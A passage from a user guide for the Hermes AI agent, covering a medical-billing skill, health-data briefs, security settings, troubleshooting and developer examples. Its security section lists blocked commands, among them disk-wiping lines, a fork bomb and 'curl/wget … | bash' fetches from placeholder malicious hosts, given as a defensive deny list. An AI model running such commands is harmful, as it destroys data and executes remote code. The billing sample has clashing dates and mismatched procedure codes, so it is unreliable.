        "patient_id": procedure["patient_id"],
        "insurance_id": procedure["insurance_id"],
        
        # Provider information
        "provider_npi": procedure["provider_npi"],
        "provider_tax_id": procedure["provider_tax_id"],
        
        # Procedure details
        "date_of_service": procedure["date"],
        "place_of_service": procedure["location_code"],
        "cpt_codes": [{"code": code, "modifier": "AA"} for code in cpt_codes],
        "icd_codes": icd_codes,
        
        # Billing
        "charges": calculate_charges(cpt_codes),
        "days_or_units": procedure.get("units", 1),
        
        # Referring physician
        "referring_provider": procedure.get("referring_provider_npi"),
    }
    return form

def calculate_charges(cpt_codes):
    """Calculate charges based on CPT codes."""
    # Fee schedule (simplified)
    fee_schedule = {
        "00400": 850.00,
        "00790": 650.00,
        "00800": 700.00,
        "01967": 1200.00,
        "99100": 150.00,
    }
    
    total = sum(fee_schedule.get(code, 0) for code in cpt_codes)
    return total
```

### Step 4: Submit to Insurance Portals

```python
def submit_claim(form, insurance_portal):
    """Submit claim to insurance portal."""
    response = requests.post(
        insurance_portal["url"],
        json={
            "claim": form,
            "provider_npi": form["provider_npi"],
            "submission_date": date.today().isoformat()
        },
        headers={
            "Authorization": f"Bearer {insurance_portal['token']}",
            "Content-Type": "application/json"
        }
    )
    response.raise_for_status()
    return response.json()

def determine_insurance_portal(patient_insurance, portals):
    """Determine which insurance portal to use."""
    insurance_map = {
        "BlueCross": "BlueCross",
        "BCBS": "BlueCross",
        "Aetna": "Aetna",
        "Medicare": "Medicare",
    }
    
    portal_name = insurance_map.get(patient_insurance)
    for portal in portals:
        if portal["name"] == portal_name:
            return portal
    
    raise ValueError(f"Unknown insurance: {patient_insurance}")
```

### Step 5: Track and Report

```python
def generate_daily_report(results):
    """Generate daily billing report."""
    report = {
        "date": date.today().isoformat(),
        "total_procedures": len(results),
        "total_billed": sum(r["charges"] for r in results),
        "claims_submitted": sum(1 for r in results if r["status"] == "submitted"),
        "claims_pending": sum(1 for r in results if r["status"] == "pending"),
        "claims_rejected": sum(1 for r in results if r["status"] == "rejected"),
        "estimated_reimbursement": sum(r["charges"] * 0.75 for r in results),  # ~75% reimbursement rate
        "details": results
    }
    return report
```

## Usage

Ask Hermes: "Process today's procedures and submit billing"

## Configuration

Set in `~/.hermes/config.yaml`:

```yaml
skills:
  config:
    medical-billing:
      emr_endpoint: https://emr.hospital.com/api
      emr_token: ${EMR_API_TOKEN}
      insurance_portals:
        - name: BlueCross
          url: https://bcbs.com/claims/api
          token: ${BCBS_TOKEN}
```

```

**Daily Output:**

```

💼 Daily Billing Complete (Jul 10, 2026)

📊 SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━
Processed: 12 procedures
Total billed: $8,450.00
Claims submitted: 12
Success rate: 100%

💰 FINANCIALS
━━━━━━━━━━━━━━━━━━━━━━━━
Estimated reimbursement: $6,337.50 (75%)
Average per procedure: $704.17
Top payer: BlueCross (5 claims, $3,525)

📋 PROCEDURES
━━━━━━━━━━━━━━━━━━━━━━━━

1. Patient #12345 - Knee arthroscopy
   CPT: 01967 | Billed: $1,200 | Status: ✓ Submitted

2. Patient #12346 - Colonoscopy
   CPT: 00790 | Billed: $650 | Status: ✓ Submitted

3. Patient #12347 - Cesarean section
   CPT: 01967, 99100 | Billed: $1,350 | Status: ✓ Submitted

[... 9 more procedures ...]

⚠️ ALERTS
━━━━━━━━━━━━━━━━━━━━━━━━
• Patient #12350: Insurance verification needed
  └─ Aetna coverage expired on 02/09/2026
  └─ Action: Contact patient for updated insurance

📈 TREND (Last 7 days)
━━━━━━━━━━━━━━━━━━━━━━━━
Avg procedures/day: 11.4
Avg billed/day: $7,998
Reimbursement rate: 76.2%
Rejection rate: 2.1%

💾 REPORT SAVED
━━━━━━━━━━━━━━━━━━━━━━━━
Notion database: "Billing Reports"
File: billing_report_2026-02-10.pdf

⏱️ TIME SAVED: ~2.5 hours

```

### **Workflow 5: WHOOP Health Integration**

**Goal:** Automatically track WHOOP health data and provide daily insights.

**Setup:**

```yaml
skills:
  install:
    - whoop-integration

cronjobs:
  - name: health-brief
    schedule: "0 7 * * *"
    task: |
      Generate daily health brief from WHOOP data:
      
      1. Fetch yesterday's data:
         - Recovery score
         - Sleep performance
         - Strain score
         - HRV (Heart Rate Variability)
         - Resting heart rate
         - Respiratory rate
         - Skin temperature
      
      2. Analyze trends:
         - Compare to 7-day average
         - Identify patterns
         - Flag anomalies
      
      3. Provide recommendations:
         - Training intensity based on recovery
         - Sleep hygiene tips if needed
         - Stress management suggestions
      
      4. Format as clean brief with emojis
    toolsets:
      - whoop-integration
    platform: telegram
```

**Sample Output:**

```
🏃 Health Summary (Jul 10, 2026)

📊 RECOVERY: 87% (GREEN) 🟢
━━━━━━━━━━━━━━━━━━━━━━━━
↑ 12% from yesterday
↑ 5% from 7-day average

Vital Signs:
  • HRV: 78 ms (↑ from 72 ms)
  • Resting HR: 52 bpm (↓ from 54 bpm)
  • Respiratory Rate: 14 breaths/min (stable)
  • Skin Temp: 36.8°C (normal)

💤 SLEEP: 7h 42m (89% quality)
━━━━━━━━━━━━━━━━━━━━━━━━
  • In-bed: 10:45 PM - 6:30 AM
  • Asleep: 10:52 PM - 6:28 AM
  • REM: 1h 48m (23%) ✓
  • Deep: 1h 32m (20%) ✓
  • Efficiency: 96% ✓
  • Disturbances: 2 (low)

⚡ STRAIN: 12.4 (MODERATE)
━━━━━━━━━━━━━━━━━━━━━━━━
  • Activity: 45 min workout
  • Calories: 542 kcal
  • Max HR: 168 bpm
  • Avg HR: 124 bpm

📈 7-DAY TRENDS
━━━━━━━━━━━━━━━━━━━━━━━━
Recovery: 79% → 87% (↑ improving)
Sleep: 7h 15m → 7h 42m (↑ better)
Strain: 13.2 → 12.4 (↓ lighter)
HRV: 71 → 78 ms (↑ excellent)

💡 RECOMMENDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━
✓ Recovery is HIGH - great day for intense training
✓ Sleep quality excellent - keep current routine
✓ HRV trending up - fitness improving
⚠️ Strain slightly low - consider adding cardio

🎯 TRAINING SUGGESTION
━━━━━━━━━━━━━━━━━━━━━━━━
Based on your recovery (87%), today is ideal for:
  • High-intensity interval training (HIIT)
  • Heavy strength training
  • Long endurance session

Avoid:
  • Rest day (you're ready to go!)

🏆 ACHIEVEMENTS
━━━━━━━━━━━━━━━━━━━━━━━━
• 7-day recovery streak: All GREEN
• Sleep consistency: 92% (bed/wake within 30 min)
• HRV personal best: 78 ms (new record!)

Keep up the great work! 💪
```

---

## **Security & Safety**

### **The Reality of AI Agent Security**

Hermes Agent is **powerful**-it can execute commands, access files, control browsers, and integrate with critical services. This power comes with **significant security responsibilities**.

**What Hermes Can Do:**

- ✅ Execute terminal commands (with your permissions)
- ✅ Read/write files on your filesystem
- ✅ Access email, calendar, and cloud services
- ✅ Control smart home devices
- ✅ Browse the web and interact with websites
- ✅ Access API keys and credentials
- ✅ Send messages on your behalf

**Potential Risks:**

- ⚠️ Accidental deletion of important files
- ⚠️ Execution of dangerous commands
- ⚠️ Exposure of sensitive data
- ⚠️ Unauthorized access to services
- ⚠️ Financial transactions (if integrated)
- ⚠️ Privacy violations

### **Security Best Practices**

#### **1. Principle of Least Privilege**

Only grant Hermes the minimum permissions needed:

```yaml
tools:
  terminal:
    enabled: true
    require_approval: true  # Require confirmation for all commands
    allowed_paths:          # Restrict file access
      - /home/username/projects
      - /mnt/data
    blocked_paths:          # Block sensitive areas
      - /etc
      - /root
      - ~/.ssh
      - ~/.gnupg
      - /var/log
  
  filesystem:
    enabled: true
    require_approval: true
    allowed_paths:
      - /home/username/documents
      - /home/username/projects
    read_only: true         # Prevent file modifications
  
  browser:
    enabled: true
    require_approval: true
    allowed_domains:        # Restrict to specific sites
      - github.com
      - stackoverflow.com
      - docs.python.org
    blocked_domains:        # Block dangerous sites
      - *.onion
      - pastebin.com
```

#### **2. Use Isolated Environments**

**Docker Backend (Recommended):**

```yaml
terminal:
  backend: docker
  docker:
    image: python:3.11-slim
    workdir: /workspace
    volumes:
      - /home/user/projects:/workspace/projects:ro  # Read-only
    network_mode: none  # No network access
    security_opt:
      - no-new-privileges:true
    read_only: true  # Read-only root filesystem
    tmpfs:
      - /tmp:size=100M
```

**SSH Backend (Remote Execution):**

```yaml
terminal:
  backend: ssh
  ssh:
    host: sandbox.example.com
    port: 22
    username: hermes
    key_path: ~/.ssh/hermes_sandbox
    workdir: /home/hermes/workspace
```

#### **3. Enable Tool Approval**

Require approval for sensitive operations:

```yaml
tools:
  terminal:
    require_approval: true
  
  filesystem:
    require_approval: true
  
  browser:
    require_approval: false  # Lower risk
  
  web_search:
    require_approval: false  # Low risk
```

**Approval Workflow:**

```
You: delete all temporary files
Hermes: ⚠️ DANGEROUS COMMAND DETECTED
        
        Command: rm -rf /tmp/*
        
        This will delete all files in /tmp directory.
        
        [APPROVE] [REJECT] [MODIFY]
        
You: [APPROVE]
Hermes: ✓ Command executed
```

#### **4. Dangerous Command Detection**

Hermes automatically detects dangerous patterns:

**Blocked Commands:**

```bash
rm -rf /
rm -rf ~
sudo rm -rf
chmod 777 /
mkfs.ext4 /dev/sda
dd if=/dev/zero of=/dev/sda
:(){ :|:& };:  # Fork bomb
curl http://malicious.com | bash
wget http://evil.com/script.sh | sh
```

**Approval Required:**

```bash
rm -rf *
sudo apt-get remove
chmod -R 777 .
git push --force
docker system prune -a
```

#### **5. Credential Management**

**Never commit credentials:**

```bash
# Add to .gitignore
.env
*.key
*.pem
auth.json
```

**Use environment variables:**

```bash
# In ~/.hermes/.env
OPENROUTER_API_KEY=sk-or-xxx
GITHUB_TOKEN=ghp_xxx
TELEGRAM_BOT_TOKEN=123456:ABCdef
```

**Rotate credentials regularly:**

```bash
# Monthly rotation script
hermes config set OPENROUTER_API_KEY $(curl -s https://openrouter.ai/keys/rotate)
```

#### **6. Network Security**

**Restrict network access:**

```yaml
terminal:
  backend: docker
  docker:
    network_mode: none  # No network
    # OR
    network_mode: bridge  # Limited network
```

**Use VPN for sensitive operations:**

```bash
# Connect to VPN before starting Hermes
sudo openvpn --config /etc/openvpn/client.conf
hermes gateway start
```

#### **7. Audit Logging**

Enable comprehensive logging:

```yaml
logging:
  level: debug
  file: ~/.hermes/logs/hermes.log
  audit:
    enabled: true
    log_commands: true
    log_file_access: true
    log_api_calls: true
    log_tool_calls: true
```

**Review logs regularly:**

```bash
# Check for suspicious activity
grep "DANGEROUS" ~/.hermes/logs/hermes.log
grep "APPROVAL" ~/.hermes/logs/hermes.log
grep "ERROR" ~/.hermes/logs/hermes.log
```

#### **8. Checkpoints & Rollback**

Enable automatic snapshots before destructive operations:

```yaml
checkpoints:
  enabled: true
  max_snapshots: 20
  auto_create: true  # Auto-create before risky operations
```

**Manual checkpoints:**

```bash
# Before major operation
hermes checkpoint create "before-refactor"

# If something goes wrong
hermes checkpoint rollback "before-refactor"

# List checkpoints
hermes checkpoint list
```

#### **9. Regular Security Audits**

```bash
# Run security audit
hermes doctor --security

# Check for outdated dependencies
hermes security audit

# Scan for exposed credentials
hermes security scan-credentials

# Review permissions
hermes security review-permissions
```

#### **10. Incident Response**

**If you suspect a security breach:**

1. **Stop Hermes immediately:**

   ```bash
   hermes gateway stop
   pkill -f hermes
   ```

2. **Revoke credentials:**

   ```bash
   # Rotate all API keys
   hermes security rotate-all-keys
   ```

3. **Check logs:**

   ```bash
   hermes logs --last 24h | grep -i "error\|dangerous\|unauthorized"
   ```

4. **Review file changes:**

   ```bash
   git diff  # If using git
   find /home/user -mtime -1 -type f  # Files modified in last 24h
   ```

5. **Restore from backup:**

   ```bash
   hermes import backup-2026-02-09.tar.gz
   ```

### **Security Features Built In**

| Feature | Description |
|---------|-------------|
| **Permissive mode disabled** | Unknown commands require approval |
| **Shell injection protection** | Sanitizes inputs in sandbox writes |
| **SSRF redirect guards** | Prevents server-side request forgery |
| **Path traversal protection** | Blocks `../` in file paths |
| **Webhook signature validation** | Verifies webhook authenticity |
| **Per-platform circuit breaker** | Stops repeated failures |
| **Checkpoints & rollback** | Filesystem safety nets |
| **Credential redaction** | Logs don't contain secrets |
| **Rate limiting** | Prevents API abuse |
| **User authorization** | Allowlists and DM pairing |

---

## **Performance Optimization**

### **Model Selection Strategy**

**For Speed (Low Latency):**

```yaml
model:
  provider: openrouter
  default: google/gemini-2.0-flash-exp:free
  # ~200ms latency, good for quick tasks
```

**For Quality (Complex Tasks):**

```yaml
model:
  provider: openrouter
  default: anthropic/claude-3.7-sonnet
  # ~2s latency, best for complex reasoning
```

**For Cost-Effectiveness:**

```yaml
model:
  provider: openrouter
  default: openrouter/auto
  # Automatically routes to cheapest capable model
```

**For Local/Offline:**

```yaml
model:
  provider: custom
  base_url: http://127.0.0.1:11434/v1
  default: qwen2.5-coder:32b
  # No API costs, complete privacy
```

### **Context Window Optimization**

**Use compression for long conversations:**

```yaml
compression:
  enabled: true
  threshold: 0.50  # Compress at 50% of context
  target_ratio: 0.20  # Keep 20% as recent tail
  protect_last_n: 20  # Last 20 messages uncompressed
```

**Start fresh sessions for unrelated topics:**

```bash
# Instead of continuing long conversation
hermes session new

# Or switch sessions
hermes session resume <session-id>
```

### **Tool Optimization**

**Disable unused toolsets:**

```yaml
agent:
  disabled_toolsets:
    - browser  # If not using browser automation
    - media    # If not using image generation
    - memory   # If not using persistent memory
```

**Use specific toolsets per platform:**

```yaml
platform_toolsets:
  hermes-telegram:
    - core
    - web
    - terminal
    # Don't load browser tools for Telegram
```

### **Caching**

**Enable prompt caching (Anthropic):**

```yaml
model:
  provider: anthropic
  default: claude-3.7-sonnet
  caching:
    enabled: true
    ttl: 3600  # Cache for 1 hour
```

**Cache web searches:**

```yaml
web:
  cache:
    enabled: true
    ttl: 86400  # Cache for 24 hours
```

### **Parallel Execution**

**Use subagents for parallel tasks:**

```
You: Research 5 different topics
Hermes: [Spawns 5 subagents in parallel]
        ✓ All research complete in 30 seconds
        (Instead of 2.5 minutes sequentially)
```

### **Local Model Optimization**

**GPU acceleration:**

```bash
# Check GPU usage
ollama ps

# Force GPU usage
OLLAMA_NUM_GPU=1 ollama serve
```

**Model quantization:**

```bash
# Use quantized models for faster inference
ollama pull qwen2.5-coder:32b-q4_k_m  # 4-bit quantization
# 50% faster, 10% quality loss
```

**Batch processing:**

```bash
# Process multiple items in one session
hermes batch process tasks.json
```

### **Network Optimization**

**Use connection pooling:**

```yaml
providers:
  openrouter:
    connection_pool:
      enabled: true
      max_connections: 10
      keep_alive: 300
```

**Compress API requests:**

```yaml
providers:
  openrouter:
    compression: true  # gzip compression
```

**Use regional endpoints:**

```yaml
providers:
  openai:
    base_url: https://api.openai.com/v1  # US
    # OR
    base_url: https://api.openai.eu/v1  # EU (lower latency for Europe)
```

### **Monitoring Performance**

```bash
# View performance stats
hermes stats

# Check latency
hermes stats --latency

# Monitor token usage
hermes stats --tokens

# Track costs
hermes stats --costs
```

---

## **Troubleshooting**

### **Common Issues & Solutions**

#### **Issue 1: "Gateway health check failed"**

**Symptoms:**

```
Error: Gateway health check failed
Status: disconnected
```

**Solutions:**

```bash
# 1. Check if gateway is running
hermes gateway status

# 2. Restart gateway
hermes gateway restart

# 3. Check logs
hermes gateway logs --last 50

# 4. Verify configuration
hermes doctor

# 5. Check port availability
lsof -i :9119  # Or your configured port

# 6. Kill existing process
pkill -f "hermes gateway"
hermes gateway start
```

#### **Issue 2: "Model not responding"**

**Symptoms:**

```
Error: Model not responding
Timeout after 30 seconds
```

**Solutions:**

```bash
# 1. Check API key
hermes config show | grep API_KEY

# 2. Test API connectivity
curl -H "Authorization: Bearer $OPENROUTER_API_KEY" \
     https://openrouter.ai/api/v1/models

# 3. Switch model
hermes model
# Choose a different model

# 4. Check rate limits
hermes stats --rate-limits

# 5. For local models (Ollama)
ollama ps  # Check if model is loaded
ollama list  # Verify model is pulled
ollama pull qwen2.5-coder:32b  # Re-pull if needed

# 6. Increase timeout
hermes config set model.timeout 60
```

#### **Issue 3: "Tool execution failed"**

**Symptoms:**

```
Error: Tool execution failed
Permission denied
```

**Solutions:**

```bash
# 1. Check tool permissions
hermes tools

# 2. Enable tool
hermes tools enable terminal

# 3. Check approval settings
hermes config show | grep require_approval

# 4. For Docker backend
docker ps  # Check if container is running
docker logs hermes-sandbox

# 5. For SSH backend
ssh -v user@host  # Test SSH connection

# 6. Check file permissions
ls -la /path/to/file
chmod 644 /path/to/file
```

#### **Issue 4: "Slow responses (30+ seconds)"**

**Symptoms:**

```
Response time: 45 seconds
```

**Solutions:**

```bash
# 1. Switch to faster model
hermes config set model.default google/gemini-2.0-flash-exp:free

# 2. For local models, check hardware
ollama ps  # Check GPU usage
nvidia-smi  # Check GPU stats

# 3. Use smaller model
ollama pull qwen3:8b  # 8B instead of 32B

# 4. Enable compression
hermes config set compression.enabled true

# 5. Reduce context length
hermes config set model.context_length 32000

# 6. Check network latency
ping openrouter.ai
```

#### **Issue 5: "Memory not persisting"**

**Symptoms:**

```
Hermes forgets previous conversations
```

**Solutions:**

```bash
# 1. Check memory files exist
ls -la ~/.hermes/memories/

# 2. Verify memory provider
hermes config show | grep memory

# 3. Check file permissions
chmod 644 ~/.hermes/memories/MEMORY.md
chmod 644 ~/.hermes/memories/USER.md

# 4. Manual memory check
cat ~/.hermes/memories/MEMORY.md

# 5. Reset memory
hermes memory clear
hermes memory rebuild

# 6. For external providers (Honcho, Mem0)
# Check API keys and connectivity
```

#### **Issue 6: "Skills not loading"**

**Symptoms:**

```
Skill not found
No skills available
```

**Solutions:**

```bash
# 1. List installed skills
hermes skills list

# 2. Install skill
hermes skills install <skill-name>

# 3. Check skill directory
ls -la ~/.hermes/skills/

# 4. Verify skill format
cat ~/.hermes/skills/my-skill.md
# Should have YAML frontmatter

# 5. Enable skill
hermes skills enable <skill-name>

# 6. Check skill logs
hermes skills logs <skill-name>
```

#### **Issue 7: "Cron jobs not running"**

**Symptoms:**

```
Cron job scheduled but not executing
```

**Solutions:**

```bash
# 1. List cron jobs
hermes cron list

# 2. Check job status
hermes cron show <job-name>

# 3. Test job manually
hermes cron run <job-name>

# 4. Check scheduler logs
hermes cron logs

# 5. Verify schedule format
# Correct: "0 9 * * *"
# Wrong: "0 9 * *"

# 6. Check timezone
hermes config show | grep timezone

# 7. Enable cron scheduler
hermes config set cron.enabled true
```

#### **Issue 8: "Platform connection failed"**

**Symptoms:**

```
Telegram: Connection refused
Discord: Invalid token
```

**Solutions:**

```bash
# 1. Verify credentials
hermes config show | grep TOKEN

# 2. Test token
# Telegram:
curl -X POST "https://api.telegram.org/bot<TOKEN>/getMe"

# Discord:
# Check token at https://discord.com/developers/applications

# 3. Re-setup platform
hermes gateway setup
# Select platform and re-enter credentials

# 4. Check platform status
hermes channels list

# 5. For WhatsApp (QR code expired)
hermes gateway restart
# Re-scan QR code

# 6. For Email (IMAP/SMTP)
# Test connection
openssl s_client -connect imap.gmail.com:993
```

### **Debug Mode**

Enable verbose logging:

```bash
# Set log level to debug
hermes config set logging.level debug

# Run with debug output
hermes --debug

# Share debug report
hermes debug share
# Uploads anonymized logs for troubleshooting
```

### **Health Check**

```bash
# Comprehensive health check
hermes doctor

# Check specific component
hermes doctor --gateway
hermes doctor --model
hermes doctor --tools

# Auto-fix issues
hermes doctor --fix
```

---

## **Best Practices**

### **1. Start Simple, Iterate**

**Don't:**

- Configure all 27 platforms at once
- Enable all 73 tools immediately
- Set up complex automation on day one

**Do:**

- Start with CLI + one platform (Telegram recommended)
- Enable core tools first (terminal, web, files)
- Add complexity gradually as you learn

### **2. Use Profiles for Different Contexts**

```bash
# Work profile
hermes -p work setup
hermes -p work config set model.default anthropic/claude-3.7-sonnet

# Personal profile
hermes -p personal setup
hermes -p personal config set model.default openrouter/free

# Development profile
hermes -p dev setup
hermes -p dev config set terminal.backend docker
```

### **3. Leverage Skills for Repetitive Tasks**

**Don't:**

- Manually perform the same task repeatedly
- Copy-paste commands every time

**Do:**

- Let Hermes create skills automatically
- Install community skills for common tasks
- Create custom skills for your workflows

### **4. Use Cron Jobs for Automation**

**Don't:**

- Manually check email/calendar every morning
- Remember to run recurring tasks

**Do:**

- Set up morning brief cron job
- Automate monitoring tasks
- Schedule regular backups

### **5. Secure Your Setup**

**Don't:**

- Run Hermes with root permissions
- Store API keys in plain text
- Enable all tools without review

**Do:**

- Use Docker backend for isolation
- Enable tool approval for sensitive operations
- Regularly audit permissions and logs

### **6. Optimize for Cost**

**Don't:**

- Use GPT-4 for simple tasks
- Leave expensive models as default
- Ignore token usage

**Do:**

- Use `openrouter/auto` for automatic routing
- Use free models for light usage
- Monitor costs with `hermes stats --costs`

### **7. Maintain Your Agent**

**Don't:**

- Ignore updates
- Let skills accumulate without review
- Never check logs

**Do:**

- Update regularly: `hermes update`
- Review skills monthly: `hermes skills list`
- Check logs weekly: `hermes logs --last 7d`

### **8. Use Memory Effectively**

**Don't:**

- Rely on Hermes to remember everything
- Never review memory files

**Do:**

- Periodically review MEMORY.md and USER.md
- Manually add important context
- Clear outdated memories

### **9. Test Before Production**

**Don't:**

- Deploy automation without testing
- Use Hermes for critical tasks immediately

**Do:**

- Test workflows in staging
- Start with low-risk tasks
- Gradually increase responsibility

### **10. Join the Community**

**Don't:**

- Struggle alone with issues
- Miss out on new features

**Do:**

- Join Discord: <https://discord.gg/nousresearch>
- Check GitHub: <https://github.com/NousResearch/hermes-agent>
- Read docs: <https://hermes-agent.nousresearch.com/docs>

---

## **Command Reference**

### **Core Commands**

```bash
# Setup & Configuration
hermes setup                    # Interactive setup wizard
hermes config                   # View current config
hermes config edit              # Edit config.yaml
hermes config set <KEY> <VAL>   # Set config value
hermes config check             # Validate configuration
hermes doctor                   # Health check
hermes doctor --fix             # Auto-fix issues

# Chat & Interaction
hermes chat                     # Start interactive chat
hermes chat -q "Hello"          # One-shot query
hermes --tui                    # Terminal UI
hermes voice                    # Voice mode

# Model Management
hermes model                    # Interactive model picker
hermes model --list             # List available models
hermes model --list --free-only # List free models only
hermes model --provider <name>  # Switch provider

# Gateway & Platforms
hermes gateway setup            # Configure platforms
hermes gateway start            # Start gateway
hermes gateway stop             # Stop gateway
hermes gateway restart          # Restart gateway
hermes gateway status           # Check status
hermes gateway logs             # View logs
hermes channels list            # List connected platforms
hermes status                   # Overall status

# Sessions
hermes session list             # List sessions
hermes session show <id>        # Show session details
hermes session search <query>   # Search sessions
hermes session resume <id>      # Resume session
hermes session new              # Create new session
hermes session cleanup          # Delete old sessions

# Skills
hermes skills list              # List installed skills
hermes skills list --available  # List available skills
hermes skills install <name>    # Install skill
hermes skills enable <name>     # Enable skill
hermes skills disable <name>    # Disable skill
hermes skills show <name>       # Show skill details
hermes skills pin <name>        # Pin skill (prevent archive)
hermes skills delete <name>     # Delete skill

# Tools
hermes tools                    # Configure tools
hermes tools enable <tool>      # Enable tool
hermes tools disable <tool>     # Disable tool

# Cron Jobs
hermes cron list                # List scheduled jobs
hermes cron add <name> <sched> <task>  # Add job
hermes cron show <name>         # Show job details
hermes cron run <name>          # Run job immediately
hermes cron remove <name>       # Remove job
hermes cron pause <name>        # Pause job
hermes cron resume <name>       # Resume job
hermes cron logs                # View cron logs

# Memory
hermes memory view              # View memory files
hermes memory edit              # Edit memory
hermes memory clear             # Clear memory
hermes memory export            # Export memory
hermes memory import <file>     # Import memory

# Checkpoints
hermes checkpoint create <name> # Create checkpoint
hermes checkpoint list          # List checkpoints
hermes checkpoint rollback <name>  # Rollback to checkpoint
hermes checkpoint delete <name> # Delete checkpoint

# Statistics & Monitoring
hermes stats                    # View statistics
hermes stats --latency          # Check latency
hermes stats --tokens           # Token usage
hermes stats --costs            # Cost tracking
hermes usage stats --week       # Weekly usage
hermes usage spend              # Spending report

# Backup & Maintenance
hermes backup                   # Full backup
hermes import <file>            # Restore from backup
hermes update                   # Update Hermes
hermes debug share              # Share debug report

# Security
hermes security audit           # Security audit
hermes security scan-credentials # Scan for exposed credentials
hermes security review-permissions # Review permissions
hermes security rotate-all-keys # Rotate all API keys
```

### **Chat Commands (In Conversation)**

```
/model <provider/model>    # Switch model
/toolsets                  # Configure toolsets
/skills                    # Manage skills
/memory                    # View/edit memory
/session                   # Session management
/compress                  # Force compression
/goal <description>        # Set persistent goal
/goals                     # List active goals
/quit                      # Exit chat
/help                      # Show help
```

### **Context References (In Messages)**

```
@file.py                   # Attach file
@src/                      # Attach directory
@git diff HEAD~5..HEAD     # Attach git diff
@https://github.com/...    # Attach URL
@session:abc123            # Reference session
```

---

## **Development & Contribution**

### **Architecture for Developers**

**Core Components:**

```
hermes-agent/
├── run_agent.py           # AIAgent - core conversation loop
├── cli.py                 # HermesCLI - terminal interface
├── model_tools.py         # Tool dispatch and registry
├── hermes_state.py        # SQLite session database
├── agent/                 # Agent internals
│   ├── prompt_builder.py  # System prompt assembly
│   ├── context_compressor.py  # Conversation compression
│   └── memory_manager.py  # Memory orchestration
├── tools/                 # Tool implementations
│   ├── registry.py        # Central tool registry
│   ├── terminal_tool.py   # Terminal orchestration
│   └── environments/      # Backend implementations
├── gateway/               # Messaging platform gateway
│   ├── run.py             # GatewayRunner
│   ├── session.py         # Session persistence
│   └── platforms/         # Platform adapters
└── tests/                 # Pytest suite (~25,000 tests)
```

### **Contributing**

**1. Fork and Clone:**

```bash
git clone https://github.com/YOUR_USERNAME/hermes-agent.git
cd hermes-agent
```

**2. Set Up Development Environment:**

```bash
# Create virtual environment
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows

# Install dependencies
pip install -e ".[dev]"

# Install pre-commit hooks
pre-commit install
```

**3. Run Tests:**

```bash
# Run all tests
pytest

# Run specific test file
pytest tests/test_agent.py

# Run with coverage
pytest --cov=hermes_agent

# Run linting
black .
isort .
flake8 .
mypy hermes_agent/
```

**4. Development Workflow:**

```bash
# Create feature branch
git checkout -b feature/my-feature

# Make changes
# ...

# Run tests
pytest

# Commit
git commit -m "Add my feature"

# Push
git push origin feature/my-feature

# Create pull request
```

### **Creating Custom Tools**

**Example: Custom Weather Tool**

```python
# tools/weather_tool.py
from typing import Optional
import requests
from .registry import register_tool

@register_tool(
    name="get_weather",
    description="Get current weather for a location",
    parameters={
        "type": "object",
        "properties": {
            "location": {
                "type": "string",
                "description": "City name or coordinates"
            },
            "units": {
                "type": "string",
                "enum": ["metric", "imperial"],
                "default": "metric"
            }
        },
        "required": ["location"]
    }
)
def get_weather(location: str, units: str = "metric") -> dict:
    """Get current weather for a location."""
    api_key = os.getenv("WEATHER_API_KEY")
    
    response = requests.get(
        "https://api.openweathermap.org/data/2.5/weather",
        params={
            "q": location,
            "appid": api_key,
            "units": units
        }
    )
    response.raise_for_status()
    
    data = response.json()
    return {
        "location": data["name"],
        "temperature": data["main"]["temp"],
        "description": data["weather"][0]["description"],
        "humidity": data["main"]["humidity"],
        "wind_speed": data["wind"]["speed"]
    }
```

**Register Tool:**

```python
# In tools/__init__.py
from .weather_tool import get_weather
```

### **Creating Custom Platform Adapters**

**Example: Custom Messaging Platform**

```python
# gateway/platforms/custom_platform.py
from .base import PlatformAdapter, MessageEvent

class CustomPlatformAdapter(PlatformAdapter):
    """Adapter for custom messaging platform."""
    
    def __init__(self, config: dict):
        super().__init__(config)
        self.api_key = config["api_key"]
        self.webhook_url = config["webhook_url"]
    
    async def start(self):
        """Start listening for messages."""
        # Set up webhook or polling
        pass
    
    async def stop(self):
        """Stop listening."""
        pass
    
    async def send_message(self, session_id: str, content: str):
        """Send message to platform."""
        response = requests.post(
            self.webhook_url,
            json={
                "session": session_id,
                "message": content
            },
            headers={"Authorization": f"Bearer {self.api_key}"}
        )
        response.raise_for_status()
    
    def parse_message(self, data: dict) -> MessageEvent:
        """Parse incoming message."""
        return MessageEvent(
            platform="custom",
            user_id=data["user_id"],
            session_id=data["session_id"],
            content=data["content"],
            timestamp=data["timestamp"]
        )
```

**Register Adapter:**

```python
# In gateway/platforms/__init__.py
from .custom_platform import CustomPlatformAdapter

PLATFORM_ADAPTERS["custom"] = CustomPlatformAdapter
```

### **Creating Custom Memory Providers**

**Example: Custom Memory Backend**

```python
# plugins/memory/custom_memory.py
from hermes.agent.memory_provider import MemoryProvider

class CustomMemoryProvider(MemoryProvider):
    """Custom memory provider."""
    
    def __init__(self, config: dict):
        self.api_key = config["api_key"]
        self.endpoint = config["endpoint"]
    
    async def store(self, key: str, value: str, metadata: dict = None):
        """Store memory."""
        response = requests.post(
            f"{self.endpoint}/store",
            json={
                "key": key,
                "value": value,
                "metadata": metadata or {}
            },
            headers={"Authorization": f"Bearer {self.api_key}"}
        )
        response.raise_for_status()
    
    async def retrieve(self, query: str, limit: int = 10) -> list:
        """Retrieve relevant memories."""
        response = requests.get(
            f"{self.endpoint}/retrieve",
            params={"query": query, "limit": limit},
            headers={"Authorization": f"Bearer {self.api_key}"}
        )
        response.raise_for_status()
        return response.json()["memories"]
    
    async def delete(self, key: str):
        """Delete memory."""
        response = requests.delete(
            f"{self.endpoint}/delete/{key}",
            headers={"Authorization": f"Bearer {self.api_key}"}
        )
        response.raise_for_status()
```

**Register Provider:**

```python
# In plugins/memory/__init__.py
from .custom_memory import CustomMemoryProvider

MEMORY_PROVIDERS["custom"] = CustomMemoryProvider
```

### **Testing**

**Unit Tests:**

```python
# tests/test_weather_tool.py
import pytest
from hermes_agent.tools.weather_tool import get_weather

def test_get_weather():
    result = get_weather("San Francisco", "metric")
    assert "location" in result
    assert "temperature" in result
    assert result["location"] == "San Francisco"

def test_get_weather_invalid_location():
    with pytest.raises(Exception):
        get_weather("InvalidCity12345")
```

**Integration Tests:**

```python
# tests/integration/test_gateway.py
import pytest
from hermes_agent.gateway.run import GatewayRunner

@pytest.mark.asyncio
async def test_gateway_telegram():
    runner = GatewayRunner(config={...})
    await runner.start()
    
    # Simulate incoming message
    message = {"user_id": "123", "content": "hello"}
